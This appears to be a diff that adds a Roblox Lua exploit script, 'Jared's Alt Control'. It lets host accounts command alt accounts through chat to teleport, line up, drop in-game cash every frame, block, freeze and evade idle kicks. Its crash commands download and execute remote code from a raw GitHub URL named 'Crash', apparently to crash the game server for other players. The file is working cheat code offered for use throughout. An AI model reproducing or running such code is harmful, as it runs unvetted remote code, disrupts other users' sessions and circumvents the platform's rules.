@@ -1,0 +1,422 @@
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+getgenv().Setting = {
+    Prefix = "jaredpogi"
+}
+
+table.insert(Settings['Host'], "Eymb0tsu")
+table.insert(Settings['Host'], "WillieJenkins65")
+
+local player = game.Players.LocalPlayer
+local isaop = false
+
+
+if table.find(Settings['Host'], "Naahoo1") then
+    player:Kick("USER BANNED")
+end
+
+if table.find(Settings['Host'],player.Name) then
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ("/crash") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jarediwuw/JMAN/main/Crash"))()
+    end
+end)
+        isaop = true
+        local a = game
+        local b = a.Workspace
+        local c = a.Lighting
+        local d = b.Terrain
+        d.WaterWaveSize = 0
+        d.WaterWaveSpeed = 0
+        d.WaterReflectance = 0
+        d.WaterTransparency = 0
+        c.GlobalShadows = false
+        c.FogEnd = 9e9
+        c.Brightness = 0
+        settings().Rendering.QualityLevel = "Level01"
+        for e, f in pairs(a:GetDescendants()) do
+           if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
+               f.Material = "Plastic"
+               f.Reflectance = 0
+           elseif f:IsA("Decal") or f:IsA("Texture") then
+               f.Transparency = 1
+           elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
+               f.Lifetime = NumberRange.new(0)
+           elseif f:IsA("Explosion") then
+               f.BlastPressure = 1
+               f.BlastRadius = 1
+           elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
+               f.Enabled = false
+           elseif f:IsA("MeshPart") then
+               f.Material = "Plastic"
+               f.Reflectance = 1
+               f.TextureID = 10385902758728957
+           end
+        end
+        for e, g in pairs(c:GetChildren()) do
+           if
+               g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or
+                   g:IsA("DepthOfFieldEffect")
+            then
+               g.Enabled = false
+           end
+        end
+	
+        return
+    else
+        setfpscap(Settings['FPS'])
+
+        UserSettings().GameSettings.MasterVolume = 0
+
+        Holder = Instance.new("ScreenGui")
+        Frame = Instance.new("Frame")
+        TextLabel = Instance.new("TextLabel")
+        TextLabel_2 = Instance.new("TextLabel")
+        TextLabel_3 = Instance.new("TextLabel")
+        TextLabel_4 = Instance.new("TextLabel")
+        TextLabel_5 = Instance.new("TextLabel")
+        TextLabel_6 = Instance.new("TextLabel")
+        TextLabel_7 = Instance.new("TextLabel")
+        TextLabel_8 = Instance.new("TextLabel")
+        TextLabel_9 = Instance.new("TextLabel")
+        Texs = Instance.new("TextLabel")
+
+        Holder.Name = "Redware"
+        Holder.Parent = game.CoreGui
+        Holder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        Holder.IgnoreGuiInset = true
+
+        Frame.Parent = Holder
+        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+        Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+        Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        Frame.Size = UDim2.new(1, 0, 1, 0)
+
+        TextLabel.Parent = Frame
+        TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+        TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        TextLabel.BackgroundTransparency = 1.000
+        TextLabel.Position = UDim2.new(0.5, 0, 0.47158523, 0)
+        TextLabel.Size = UDim2.new(0, 300, 0, 60)
+        TextLabel.Font = Enum.Font.GothamBlack
+        TextLabel.Text = "Jared's Alt Control"
+        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TextLabel.TextScaled = true
+        TextLabel.TextSize = 14.000
+        TextLabel.TextWrapped = true
+
+        TextLabel_2.Parent = Frame
+        TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
+        TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        TextLabel_2.BackgroundTransparency = 1.000
+        TextLabel_2.Position = UDim2.new(0.499739617, 0, 0.559961051, 0)
+        TextLabel_2.Size = UDim2.new(0, 220, 0, 70)
+        TextLabel_2.Font = Enum.Font.GothamBlack
+        TextLabel_2.Text = game.Players.LocalPlayer.Name
+        TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TextLabel_2.TextScaled = true
+        TextLabel_2.TextSize = 14.000
+        TextLabel_2.TextWrapped = true
+
+        wait(.5)
+
+        local a = game
+        local b = a.Workspace
+        local c = a.Lighting
+        local d = b.Terrain
+        d.WaterWaveSize = 0
+        d.WaterWaveSpeed = 0
+        d.WaterReflectance = 0
+        d.WaterTransparency = 0
+        c.GlobalShadows = false
+        c.FogEnd = 9e9
+        c.Brightness = 0
+        settings().Rendering.QualityLevel = "Level01"
+        for e, f in pairs(a:GetDescendants()) do
+           if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
+               f.Material = "Plastic"
+               f.Reflectance = 0
+           elseif f:IsA("Decal") or f:IsA("Texture") then
+               f.Transparency = 1
+           elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
+               f.Lifetime = NumberRange.new(0)
+           elseif f:IsA("Explosion") then
+               f.BlastPressure = 0
+               f.BlastRadius = 0
+           elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
+               f.Enabled = false
+           elseif f:IsA("MeshPart") then
+               f.Material = "Plastic"
+               f.Reflectance = 0
+               f.TextureID = 10385902758728957
+           end
+        end
+        for e, g in pairs(c:GetChildren()) do
+           if
+               g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or
+                   g:IsA("DepthOfFieldEffect")
+            then
+               g.Enabled = false
+           end
+        end
+end
+
+local function cmds(msg,plr)
+	if isaop == false or table.find(Settings['Host'],game.Players:GetPlayerByUserId(plr).Name) then
+		if msg == Setting['Prefix'].."bring" then
+			if not isaop then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.X,game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Y,game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Z)
+                Freeze(false)
+                DropCash(false)
+                Blocking(false)
+                StopHover()
+			end
+		elseif msg == Setting['Prefix'].."drop" then
+			if not isaop then
+                DropCash(true)
+                Blocking(true)
+            end
+		elseif msg == Setting['Prefix'].."stop" then
+			if not isaop then
+                DropCash(false)
+                Blocking(false)
+             end
+		elseif msg == Setting['Prefix'].."freeze" then
+			if not isaop then
+                Freeze(true)
+             end
+		elseif msg == Setting['Prefix'].."unfreeze" then
+			if not isaop then
+                Freeze(false)
+             end
+		elseif msg == Setting['Prefix'].."wallet show" then
+			if not isaop then
+                ShowWallet()
+             end
+		elseif msg == Setting['Prefix'].."wallet hide" then
+			if not isaop then
+                HideWallet()
+             end
+		elseif msg == Setting['Prefix'].."setup" then
+			if not isaop then
+                SetupLine(game.Players:GetPlayerByUserId(plr))
+                Freeze(false)
+                wait(1)
+                Freeze(true)
+                StopHover()
+            end
+		elseif msg == Setting['Prefix'].."crash" then
+			if not isaop then
+                if getgenv().Alts['Alt1'] == game.Players.LocalPlayer.UserId then
+                    Freeze(false)
+                    DropCash(false)
+                    setfpscap(60)
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jarediwuw/JMAN/main/Crash"))()
+                end
+            end
+        end
+	end
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if table.find(Settings['Host'],plr.Name) then
+        game:service"ReplicatedStorage".DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data) 
+        local user = data.FromSpeaker
+        local msg = data.Message
+        cmds(msg,plr.UserId)
+		end)
+	end
+end)
+
+for item,plr in pairs(game.Players:GetChildren()) do
+	if table.find(Settings['Host'],plr.Name) then
+        game:service"ReplicatedStorage".DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data) 
+        local user = data.FromSpeaker
+        local msg = data.Message
+        cmds(msg,plr.UserId)
+		end)
+	end
+end
+
+function SetupLine(TheTarget)
+    if game.Players.LocalPlayer.UserId == getgenv().Alts['Alt1'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(5, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt2'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(10, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt3'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(15, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt4'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(20, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt5'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(25, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt6'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(30, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt7'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(35, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt8'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(40, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt9'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(45, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt10'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(50, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt11'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(55, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt12'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(60, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt13'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(60, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt14'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(65, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt15'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(60, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt16'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(65, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt17'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(70, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt18'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(75, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt19'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(80, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt20'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(85, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt21'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(90, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt22'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(95, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt23'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(100, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt24'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(105, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt25'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(110, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt26'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(115, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt27'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(120, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt28'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(125, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt29'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(130, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt30'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(135, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt31'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(140, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt32'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(145, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt33'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(150, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt34'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(155, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt35'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(160, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt36'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(165, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt37'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(170, 0, 0)
+    elseif game.Players.LocalPlayer.UserId == getgenv().Alts['Alt38'] then
+        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = TheTarget.Character:FindFirstChild('HumanoidRootPart').CFrame * CFrame.new(175, 0, 0)
+    end
+end
+
+local Toggles = {
+    Freeze = false,
+    Dropping = false,
+    Blocking = false,
+}
+
+if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
+    Toggles['Freeze'] = false
+    Toggles['Dropping'] = false
+    Toggles['Blocking'] = false
+    DropCash(false)
+    Freeze(false)
+end 
+
+local MainEvent = game:service"ReplicatedStorage".MainEvent
+
+game:service"RunService".Stepped:Connect(function()
+    if Toggles['Dropping'] == true then
+        MainEvent:FireServer("DropMoney",10000)
+    end
+    if Toggles['Blocking'] == true then
+        MainEvent:FireServer("Block",true)
+    end
+    if Toggles['DelCash'] == true then
+        for e, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
+            if v.Name == 'MoneyDrop' then
+                v:Destroy()
+            end
+        end
+    end
+end)
+
+Toggles['DelCash'] = true
+
+function DropCash(boolean)
+    Toggles['Dropping'] = boolean
+end
+
+function ShowWallet()
+    local Player = game.Players.LocalPlayer
+    if Player.Backpack:FindFirstChild("Wallet") then
+        Player.Backpack.Wallet.Parent = game.Players.LocalPlayer.Character
+    end
+end
+
+function HideWallet()
+    local Player = game.Players.LocalPlayer
+    if Player.Character:FindFirstChild("Wallet") then
+        Player.Character.Wallet.Parent = game.Players.LocalPlayer.Backpack
+    end
+end
+
+function Blocking(boolean)
+    Toggles['Blocking'] = boolean
+        if boolean == false then
+        wait()
+        MainEvent:FireServer("Block",false)
+    end
+end
+
+function DelCash(boolean)
+    Toggles['DelCash'] = boolean
+end
+
+function Freeze(boolean)
+    if boolean == true then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        Toggles['Freeze'] = boolean
+    elseif boolean == false then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        Toggles['Freeze'] = boolean
+    end
+end
+
+function say(msg)
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
+end
+
+
+local player = game.Players.LocalPlayer
+
+player.Idled:Connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
+    wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
+end)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-870, -38.39921188354492, -586)
+wait(.5)
+local spawn
+local plr = game.Players.LocalPlayer
+
+spawn = plr.Character.HumanoidRootPart.CFrame 
+
+plr.CharacterAdded:Connect(function(char)
+    if type(spawn) == "userdata" then
+        wait(.5)
+        char:WaitForChild'HumanoidRootPart'.CFrame = spawn
+    end
+end)
